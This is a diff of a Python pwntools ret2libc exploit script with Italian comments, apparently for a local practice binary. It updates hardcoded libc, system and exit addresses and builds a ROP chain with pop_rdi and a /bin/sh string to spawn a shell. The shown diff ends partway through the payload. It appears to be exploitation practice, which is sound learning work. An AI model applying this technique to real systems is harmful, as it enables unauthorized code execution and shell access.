@@ -6,14 +6,17 @@ from pwn import p64
 # Ha bisogno di ASLR disabilitato.
 def main():
     e = ELF('../Machines/ret2libc')
-    libc_addr = 0x7ffff7dc8000 #indirizzo base di libc nel file eseguibile
+    #libc_addr = 0x7ffff7dc9000 #indirizzo base di libc nel file eseguibile
+    libc_addr = 0x7ffff7dc7000 #da portatile
 
     ret = p64(libc_addr + 0xc1801) #offset
     pop_rdi = p64(libc_addr + 0x23b6a) #offset
     bin_sh = p64(libc_addr + 0x1b45bd) #offset
 
-    system_addr = p64(0x7ffff7e1a290)
-    exit_addr = p64(0x7ffff7e0ea40)
+    #system_addr = p64(0x7ffff7e1b290)
+    system_addr = p64(0x7ffff7c4e520) #da portatile
+    #exit_addr = p64(0x7ffff7e0fa40)
+    exit_addr = p64(0x7ffff7c3e600) #da portatile
 
     payload = b"A" * 256
     payload += b"BBBBBBBB"
